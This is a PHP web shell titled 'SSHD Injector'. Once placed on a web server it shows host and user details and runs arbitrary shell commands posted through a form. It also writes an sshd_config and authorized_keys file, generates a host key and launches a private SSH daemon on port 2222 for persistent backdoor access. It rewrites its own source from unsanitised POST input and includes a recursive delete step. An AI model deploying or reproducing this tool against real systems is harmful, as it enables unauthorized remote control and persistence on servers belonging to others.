<!DOCTYPE html>
<!-- Alexis Giraudet -->
<?php

if(isset($_POST["sshd"]) || isset($_POST["sshkeygen"]) || isset($_POST["workspace"]) || isset($_POST["ldlibrarypath"]))
{    
    $script_content = file_get_contents(basename(__FILE__));

    if(isset($_POST["sshd"]))
    {
        $script_content = preg_replace('#\$sshd_bin = "[^"]+";#', '$sshd_bin = "'.$_POST["sshd"].'";', $script_content);
    }

    if(isset($_POST["sshkeygen"]))
    {
        $script_content = preg_replace('#\$ssh_keygen_bin = "[^"]+";#', '$ssh_keygen_bin = "'.$_POST["sshkeygen"].'";', $script_content);
    }

    if(isset($_POST["workspace"]))
    {
        $script_content = preg_replace('#\$workspace = "[^"]+";#', '$workspace = "'.$_POST["workspace"].'";', $script_content);
    }

    if(isset($_POST["ldlibrarypath"]))
    {
        $script_content = preg_replace('#\$ld_library_path = "[^"]+";#', '$ld_library_path = "'.$_POST["ldlibrarypath"].'";', $script_content);
    }

    file_put_contents(basename(__FILE__), $script_content);

    header("Location:".basename(__FILE__));

    exit(0);
}

$sshd_bin = "sshd";
$ssh_keygen_bin = "ssh-keygen";
$workspace = ".";
$ld_library_path = ".";

$workspace = realpath($workspace);
if($workspace === FALSE)
{
    $workspace = realpath(NULL);
}

$path = getenv("PATH");
if($path === FALSE)
{
    $path = $workspace;
}

$cmd_prefix = "LD_LIBRARY_PATH=$ld_library_path ";
$cmd_postfix = " 2>&1";

$sshd_path = $workspace."/.sshd";
$sshd_authorized_keys = $sshd_path."/authorized_keys";
$sshd_config = $sshd_path."/sshd_config";
$sshd_hostkey = $sshd_path."/sshd_host_key";
$sshd_pidfile = $sshd_path."/sshd.pid";

$sshd_path_exist = @is_dir($sshd_path);
$sshd_authorized_keys_exist = @is_file($sshd_authorized_keys);
$sshd_config_exist = @is_file($sshd_config);
$sshd_hostkey_exist = @is_file($sshd_hostkey);
$sshd_pidfile_exist = @is_file($sshd_pidfile);

$sshd_default_config_content =
"Port 2222
HostKey $sshd_hostkey
UsePrivilegeSeparation no
PidFile $sshd_pidfile
AuthorizedKeysCommand $sshd_authorized_keys";

$file_exist = "present";
$not_file_exist = "absent";

function prepare_dir($dir)
{
    if(@is_dir($dir))
    {
        return TRUE;
    }
    return @mkdir($dir);
}

?>
<html>
    <head>
        <meta charset="utf-8">
        <title>SSHD Injector</title>
        <style>
        p, table, th, td { border: thin solid black; width: 100%; }
        .allwidth { width: 100%; }
        </style>
    </head>
    <body>
        <p>
            <?php echo htmlentities(shell_exec("uname -a")); ?>
            <br>
            <?php echo htmlentities(shell_exec("id")); ?>
            <br>
            <?php echo htmlentities("PATH = ".$path); ?>
            <br>
            <?php echo htmlentities("LD_LIBRARY_PATH = ".$ld_library_path); ?>
            <br>
            <?php echo htmlentities("workspace = ".$workspace); ?>
            <br>
            <?php echo htmlentities("sshd = ".$sshd_bin); ?>
            <br>
            <?php echo htmlentities("ssh-keygen = ".$ssh_keygen_bin); ?>
            <br>
        </p>
        <form method="post" action="<?php echo basename(__FILE__); ?>">
            <fieldset>
                <legend>Update sshd_config</legend>
<?php
                if(isset($_POST["sshd_config_content"]))
                {
                    echo "<p>";
                    if((!prepare_dir($sshd_path)) || (file_put_contents($sshd_config, $_POST["sshd_config_content"]) === FALSE))
                    {
                        echo "Error";
                    }
                    else
                    {
                        echo "sshd-config updated";
                    }
                    echo "</p>";
                }
?>
<textarea name="sshd_config_content" class="allwidth" required>
<?php
                    $sshd_config_content = @file_get_contents($sshd_config);
                    if($sshd_config_content === FALSE)
                    {
                        echo $sshd_default_config_content;
                    }
                    else
                    {
                        echo $sshd_config_content;
                    }
?>
</textarea>
                <br>
                <input type="submit" value="Update sshd_config" class="allwidth">
            </fieldset>
        </form>
        <form method="post" action="<?php echo basename(__FILE__); ?>">
            <fieldset>
                <legend>Update authorized_keys</legend>
<?php
                if(isset($_POST["authorized_keys_content"]))
                {
                    echo "<p>";
                    if((!prepare_dir($sshd_path)) || (file_put_contents($sshd_authorized_keys, $_POST["authorized_keys_content"]) === FALSE))
                    {
                        echo "Error";
                    }
                    else
                    {
                        echo "authorized-keys updated";
                    }
                    echo "</p>";
                }
?>
<textarea name="authorized_keys_content" class="allwidth" required>
<?php
                    $sshd_authorized_keys_content = @file_get_contents($sshd_authorized_keys);
                    if($sshd_authorized_keys_content === FALSE)
                    {
                        ;
                    }
                    else
                    {
                        echo $sshd_authorized_keys_content;
                    }
?>
</textarea>
                <br>
                <input type="submit" value="Update authorized_keys" class="allwidth">
            </fieldset>
        </form>
        <form method="post" action="<?php echo basename(__FILE__); ?>">
            <fieldset>
                <legend>Start Stop Clear sshd</legend>
<?php
                if(isset($_POST["clear"]) && ($_POST["clear"] == "checked"))
                {
                    $clear_cmd = "rm -rf $sshd_path 2>&1";
                    echo "<p>";
                    echo htmlentities("$ ".$clear_cmd)."<br>";
                    echo nl2br(htmlentities(shell_exec($clear_cmd)));
                    echo "</p>";
                }
?>
                <div><input type="checkbox" name="clear" id="clear" value="checked"><label for="clear">Clear</label></div>
                <br>
<?php
                if(isset($_POST["stop"]) && ($_POST["stop"] == "checked"))
                {
                    $stop_cmd = "kill `cat $sshd_pidfile` 2>&1 ; rm $sshd_pidfile";
                    echo "<p>";
                    echo htmlentities("$ ".$stop_cmd)."<br>";
                    echo nl2br(htmlentities(shell_exec($stop_cmd)));
                    echo "</p>";
                }
?>
                <div><input type="checkbox" name="stop" id="stop" value="checked"><label for="stop">Stop</label></div>
                <br>
<?php
                if(isset($_POST["start"]) && ($_POST["start"] == "checked"))
                {
                    $start_cmd = "$sshd_bin -f $sshd_config 2>&1";
                    echo "<p>";
                    echo htmlentities("$ ".$start_cmd)."<br>";
                    echo nl2br(htmlentities(shell_exec($start_cmd)));
                    echo "</p>";
                }
?>
                <div><input type="checkbox" name="start" id="start" value="checked"><label for="start">Start</label></div>
                <br>
<?php
                if(isset($_POST["keygen"]) && ($_POST["keygen"] == "checked"))
                {
                    $keygen_cmd = "$ssh_keygen_bin -f $sshd_hostkey -N '' 2>&1";
                    echo "<p>";
                    echo htmlentities("$ ".$keygen_cmd)."<br>";
                    echo nl2br(htmlentities(shell_exec($keygen_cmd)));
                    echo "</p>";
                }
?>
                <div><input type="checkbox" name="keygen" id="keygen" value="checked"><label for="keygen">Generate key</label></div>
                <br>
                <input type="submit" value="Execute" class="allwidth">
            </fieldset>
        </form>
        <form method="post" action="<?php echo basename(__FILE__); ?>">
            <fieldset>
                <legend>Execute command</legend>
<?php
                if(isset($_POST["command"]))
                {
                    echo "<p>";
                    echo htmlentities("$ ".$_POST["command"])."<br>";
                    echo nl2br(htmlentities(shell_exec($_POST["command"])));
                    echo "</p>";
                }
?>
                <input type="text" name="command" value="find `echo $PATH | tr ':' ' '` -name 'sshd' 2> /dev/null" class="allwidth">
                <br>
                <input type="submit" value="Execute" class="allwidth">
            </fieldset>
        </form>
        <form method="post" action="<?php echo basename(__FILE__); ?>">
            <fieldset>
                <legend>Update sshd ssh-keygen workspace</legend>
                <label>sshd = </label><input type="text" name="sshd" value="<?php echo $sshd_bin; ?>" required>
                <br>
                <label>ssh-keygen = </label><input type="text" name="sshkeygen" value="<?php echo $ssh_keygen_bin; ?>" required>
                <br>
                <label>workspace = </label><input type="text" name="workspace" value="<?php echo $workspace; ?>" required>
                <br>
                <label>LD_LIBRARY_PATH = </label><input type="text" name="ldlibrarypath" value="<?php echo $ld_library_path; ?>" required>
                <br>
                <input type="submit" value="Update sshd ssh-keygen workspace" class="allwidth">
            </fieldset>
        </form>
        <table>
            <tr>
                <td><?php echo htmlentities($sshd_path); ?></td>
                <td><?php if($sshd_path_exist){ echo $file_exist; } else{ echo $not_file_exist; } ?></td>
            </tr>
            <tr>
                <td><?php echo htmlentities($sshd_authorized_keys); ?></td>
                <td><?php if($sshd_authorized_keys_exist){ echo $file_exist; } else{ echo $not_file_exist; } ?></td>
            </tr>
            <tr>
                <td><?php echo htmlentities($sshd_config); ?></td>
                <td><?php if($sshd_config_exist){ echo $file_exist; } else{ echo $not_file_exist; } ?></td>
            </tr>
            <tr>
                <td><?php echo htmlentities($sshd_hostkey); ?></td>
                <td><?php if($sshd_hostkey_exist){ echo $file_exist; } else{ echo $not_file_exist; } ?></td>
            </tr>
            <tr>
                <td><?php echo htmlentities($sshd_pidfile); ?></td>
                <td><?php if($sshd_pidfile_exist){ echo $file_exist; } else{ echo $not_file_exist; } ?></td>
            </tr>
        </table>
    </body>
</html>
